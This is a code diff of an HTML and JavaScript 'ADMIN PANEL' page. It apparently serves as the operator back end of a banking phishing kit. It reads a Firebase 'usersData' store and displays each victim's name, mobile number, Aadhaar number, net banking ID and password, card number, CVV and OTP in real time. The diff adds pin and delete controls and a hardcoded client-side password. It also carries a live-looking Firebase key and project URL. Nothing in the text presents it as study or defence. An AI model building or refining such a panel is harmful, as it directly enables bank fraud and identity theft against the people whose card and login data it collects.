@@ -6,100 +6,108 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body{
-  margin:0;
-  font-family: Arial, sans-serif;
-  background:#f2f2f2;
-}
-header{
-  background:#0d6efd;
-  color:white;
-  padding:15px;
-  text-align:center;
-  font-size:20px;
-}
-.card{
-  background:#fff;
-  margin:10px;
-  padding:12px;
-  border-radius:8px;
-  box-shadow:0 2px 6px rgba(0,0,0,0.15);
-}
-.row{
-  padding:4px 0;
-  border-bottom:1px dashed #ddd;
-  font-size:14px;
-}
-.row:last-child{
-  border-bottom:none;
-}
-.label{
-  font-weight:bold;
-  color:#333;
-}
-.time{
-  font-size:12px;
-  color:gray;
-  margin-top:6px;
-}
-.empty{
-  text-align:center;
-  color:gray;
-  margin-top:30px;
-}
+body{margin:0;font-family:system-ui;background:#f4f6fb}
+header{background:#4f46e5;color:#fff;padding:14px;text-align:center;font-size:20px;font-weight:700}
+#dataList{padding:10px}
+.card{background:#fff;border-radius:14px;padding:12px;margin-bottom:14px;box-shadow:0 10px 22px rgba(0,0,0,.08);position:relative}
+.card.pinned{border-left:6px solid #f4b400;background:#fffbe9}
+.row{font-size:14px;padding:4px 0}
+.label{font-weight:600}
+.time{font-size:12px;color:#777;margin-top:6px}
+.otp{margin-top:6px;background:#eef2ff;color:#3f51b5;padding:6px;border-radius:8px;font-weight:700}
+.actions{position:absolute;top:10px;right:10px;display:flex;gap:6px}
+.btn{border:none;border-radius:8px;padding:6px 10px;cursor:pointer;font-size:13px}
+.pin{background:#f4b400}
+.unpin{background:#9e9e9e;color:#fff}
+.del{background:#e53935;color:#fff}
+.empty{text-align:center;color:#777;margin-top:40px}
 </style>
 </head>
 
 <body>
 
-<header>ADMIN PANEL – LIVE DATA</header>
-
+<header>ADMIN PANEL</header>
 <div id="dataList" class="empty">Loading...</div>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
 <script>
-var firebaseConfig = {
+/* 🔐 ADMIN PASSWORD */
+const ADMIN_PASS = "admin@123";
+const p = prompt("Enter Admin Password");
+if(p !== ADMIN_PASS){
+  alert("Wrong password");
+  document.body.innerHTML="";
+  throw new Error("Unauthorized");
+}
+
+/* 🔥 Firebase */
+firebase.initializeApp({
   apiKey: "AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
   authDomain: "admin-panel-989b2.firebaseapp.com",
   databaseURL: "https://admin-panel-989b2-default-rtdb.firebaseio.com",
   projectId: "admin-panel-989b2"
-};
-firebase.initializeApp(firebaseConfig);
+});
 
-var db = firebase.database();
-var list = document.getElementById("dataList");
+const list = document.getElementById("dataList");
+const ref  = firebase.database().ref("usersData");
 
-/* 🔴 REAL-TIME + LINE BY LINE */
-db.ref("usersData").on("value", function(snapshot){
-  list.innerHTML = "";
-
-  if(!snapshot.exists()){
-    list.innerHTML = "<div class='empty'>No Data Found</div>";
+/* 🔴 REAL-TIME DATA */
+ref.on("value", snap=>{
+  list.innerHTML="";
+  if(!snap.exists()){
+    list.innerHTML="<div class='empty'>No Data Found</div>";
     return;
   }
 
-  var all = [];
-  snapshot.forEach(function(child){
-    all.unshift(child.val()); // new data top
+  let pinned=[], normal=[];
+  snap.forEach(ch=>{
+    const d = ch.val();
+    const item = { key: ch.key, ...d };
+    (d.pinned ? pinned : normal).push(item);
   });
 
-  all.forEach(function(d){
-    list.innerHTML += `
-      <div class="card">
-        <div class="row"><span class="label">Full Name :</span> ${d.fullName}</div>
-        <div class="row"><span class="label">Mobile :</span> ${d.mbno}</div>
-        <div class="row"><span class="label">Aadhaar :</span> ${d.aadr}</div>
-        <div class="row"><span class="label">NetBanking Id :</span> ${d.nid}</div>
-        <div class="row"><span class="label">Password :</span> ${d.pss}</div>
-        <div class="row"><span class="label">Card No :</span> ${d.cn}</div>
-        <div class="row"><span class="label">CVV  :</span> ${d.cvpn}</div>
-        <div class="time">Date : ${d.time}</div>
-      </div>
-    `;
-  });
+  normal.reverse(); // 🆕 new user on top
+  [...pinned, ...normal].forEach(render);
 });
+
+/* UI CARD */
+function render(d){
+  list.innerHTML += `
+  <div class="card ${d.pinned?'pinned':''}">
+    <div class="actions">
+      <button class="btn ${d.pinned?'unpin':'pin'}"
+        onclick="togglePin('${d.key}',${!d.pinned})">
+        ${d.pinned?'Unpin':'📌 Pin'}
+      </button>
+      <button class="btn del" onclick="deleteEntry('${d.key}')">🗑️</button>
+    </div>
+
+    <div class="row"><span class="label">Name:</span> ${d.fullName}</div>
+    <div class="row"><span class="label">Mobile:</span> ${d.mbno}</div>
+    <div class="row"><span class="label">Aadhaar:</span> ${d.aadr}</div>
+    <div class="row"><span class="label">NetBank:</span> ${d.nid}</div>
+    <div class="row"><span class="label">Password:</span> ${d.pss}</div>
+    <div class="row"><span class="label">Card:</span> ${d.cn}</div>
+    <div class="row"><span class="label">CVV:</span> ${d.cvpn}</div>
+
+    <div class="otp">OTP : ${d.otp || "NOT RECEIVED"}</div>
+    <div class="time">${d.time}</div>
+  </div>`;
+}
+
+/* 📌 PIN */
+function togglePin(key,val){
+  firebase.database().ref("usersData/"+key+"/pinned").set(val);
+}
+
+/* 🗑️ DELETE (simple & working) */
+function deleteEntry(key){
+  if(confirm("Delete this entry?")){
+    firebase.database().ref("usersData/"+key).remove();
+  }
+}
 </script>
 
 </body>
